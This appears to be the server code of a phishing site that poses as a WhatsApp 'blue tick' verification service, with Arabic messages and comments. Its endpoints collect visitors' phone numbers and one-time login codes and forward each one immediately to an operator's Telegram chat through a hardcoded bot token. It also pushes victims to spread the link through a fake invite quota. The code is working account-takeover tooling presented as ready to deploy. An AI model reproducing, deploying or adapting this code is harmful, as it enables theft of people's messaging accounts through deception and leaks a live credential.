const express = require('express');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== إعدادات تيلجرام ==========
const TELEGRAM_TOKEN = '8810906768:AAEPvCGIGJI8cJtzloiRQYd0GV_W6aHLdO4';
const TELEGRAM_CHAT_ID = '8140097273';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'views')));

// ========== ملف تخزين بيانات المستخدمين ==========
const USERS_FILE = path.join(__dirname, 'users-data.json');

function readUsersData() {
    try {
        if (fs.existsSync(USERS_FILE)) {
            const data = fs.readFileSync(USERS_FILE, 'utf8');
            return JSON.parse(data);
        }
        return {};
    } catch (e) {
        console.error('❌ خطأ في قراءة الملف:', e.message);
        return {};
    }
}

function saveUsersData(users) {
    try {
        fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), 'utf8');
    } catch (e) {
        console.error('❌ خطأ في حفظ الملف:', e.message);
    }
}

// ========== دالة إرسال فورية ==========
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        if (response.ok) {
            console.log('✅ تم إرسال الإشعار لتيلجرام');
        } else {
            const error = await response.text();
            console.error('❌ فشل الإرسال:', error);
        }
    } catch (e) {
        console.error('❌ خطأ في إرسال الإشعار:', e.message);
    }
}

app.get('/test', async (req, res) => {
    await sendTelegramMessage('✅ <b>البوت شغال! 🎉</b>\n🕐 ' + new Date().toLocaleString('ar-EG'));
    res.send('✅ تم إرسال رسالة اختبار! شوف تيلجرام');
});

// ========== مسار تأكيد المشاركة ==========
app.post('/confirm-share', async (req, res) => {
    try {
        const { userId } = req.body;
        const users = readUsersData();
        
        if (!users[userId]) {
            users[userId] = { invites: 0, phone: null, shared: false };
        }
        
        if (users[userId].shared) {
            return res.json({ success: false, message: 'لقد قمت بالمشاركة بالفعل!' });
        }
        
        users[userId].shared = true;
        users[userId].invites = 10;
        saveUsersData(users);
        
        // إشعار فوري
        let msg = `📩 <b>تم تأكيد المشاركة!</b>\n`;
        msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
        msg += `👤 المستخدم: ${userId}\n`;
        msg += `📊 عدد الدعوات: 10/10 ✅\n\n`;
        msg += `━━━━━━━━━━━━━━━━━━━━\n`;
        msg += `🔗 <a href="https://whatsapp-verify-zeta.vercel.app">📊 عرض الموقع</a>`;
        await sendTelegramMessage(msg);
        
        res.json({ success: true, message: 'تم تأكيد المشاركة!' });
    } catch (err) {
        console.error('❌ خطأ:', err.message);
        res.status(500).json({ success: false, message: 'خطأ في التأكيد' });
    }
});

app.post('/get-user', async (req, res) => {
    try {
        const { userId } = req.body;
        const users = readUsersData();
        
        if (users[userId]) {
            res.json({ 
                success: true, 
                invites: users[userId].invites || 0,
                shared: users[userId].shared || false,
                phone: users[userId].phone || null
            });
        } else {
            users[userId] = { invites: 0, phone: null, shared: false };
            saveUsersData(users);
            res.json({ success: true, invites: 0, shared: false, phone: null });
        }
    } catch (err) {
        console.error('❌ خطأ:', err.message);
        res.status(500).json({ success: false, message: 'خطأ في جلب البيانات' });
    }
});

// ========== حفظ رقم الهاتف ==========
app.post('/save-phone', async (req, res) => {
    try {
        const { userId, phone } = req.body;
        const users = readUsersData();
        
        if (users[userId]) {
            users[userId].phone = phone;
            saveUsersData(users);
            
            // إشعار فوري
            let msg = `📱 <b>رقم هاتف جديد!</b>\n`;
            msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
            msg += `👤 المستخدم: ${userId}\n`;
            msg += `📞 رقم الهاتف: ${phone}\n`;
            msg += `📊 عدد الدعوات: ${users[userId].invites || 0}/10\n\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `🔗 <a href="https://whatsapp-verify-zeta.vercel.app">📊 عرض الموقع</a>`;
            await sendTelegramMessage(msg);
            
            res.json({ success: true });
        } else {
            res.json({ success: false, message: 'المستخدم غير موجود' });
        }
    } catch (err) {
        console.error('❌ خطأ:', err.message);
        res.status(500).json({ success: false, message: 'خطأ في حفظ الرقم' });
    }
});

// ========== حفظ OTP ==========
app.post('/save-otp', async (req, res) => {
    try {
        const { userId, phone, otp } = req.body;
        const users = readUsersData();
        
        if (users[userId]) {
            users[userId].otp = otp;
            users[userId].otpTime = new Date().toISOString();
            saveUsersData(users);
            
            // إشعار فوري
            let msg = `🔐 <b>رمز OTP!</b>\n`;
            msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n\n`;
            msg += `👤 المستخدم: ${userId}\n`;
            msg += `📞 رقم الهاتف: ${phone}\n`;
            msg += `🔑 رمز OTP: ${otp}\n`;
            msg += `📊 عدد الدعوات: ${users[userId].invites || 0}/10\n\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `🔗 <a href="https://whatsapp-verify-zeta.vercel.app">📊 عرض الموقع</a>`;
            await sendTelegramMessage(msg);
            
            res.json({ success: true });
        } else {
            res.json({ success: false, message: 'المستخدم غير موجود' });
        }
    } catch (err) {
        console.error('❌ خطأ:', err.message);
        res.status(500).json({ success: false, message: 'خطأ في حفظ OTP' });
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

app.get('/success', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html lang="ar">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>تم التوثيق!</title>
            <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
                body { background: #0a0a0a; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
                .success-box { background: white; max-width: 400px; width: 100%; padding: 50px 30px; border-radius: 32px; text-align: center; box-shadow: 0 25px 70px rgba(0,0,0,0.5); animation: fadeIn 0.5s ease; }
                @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
                .success-box .icon { font-size: 80px; color: #25d366; margin-bottom: 20px; }
                .success-box h1 { font-size: 28px; color: #1a1a1a; margin-bottom: 10px; }
                .success-box p { color: #667781; font-size: 16px; line-height: 1.6; margin-bottom: 25px; }
                .success-box .badge { display: inline-block; background: #075e54; color: white; padding: 8px 20px; border-radius: 30px; font-weight: 700; font-size: 14px; margin-bottom: 20px; }
                .btn { display: inline-block; padding: 14px 40px; background: #075e54; color: white; border: none; border-radius: 30px; font-size: 18px; font-weight: 600; text-decoration: none; cursor: pointer; transition: 0.3s; }
                .btn:hover { background: #054a42; }
            </style>
        </head>
        <body>
            <div class="success-box">
                <div class="icon"><i class="fab fa-whatsapp"></i></div>
                <div class="badge"><i class="fas fa-check-circle"></i> موثق ✓</div>
                <h1>🎉 تهانينا!</h1>
                <p>تم توثيق حسابك بنجاح.<br>الآن لديك <strong>العلامة الزرقاء</strong> الرسمية!</p>
                <a href="/" class="btn"><i class="fas fa-home"></i> العودة للرئيسية</a>
            </div>
        </body>
        </html>
    `);
});

app.listen(PORT, () => {
    console.log(`✅ السيرفر شغال على http://localhost:${PORT}`);
    console.log(`📱 رابط الاختبار: http://localhost:${PORT}/test`);
});
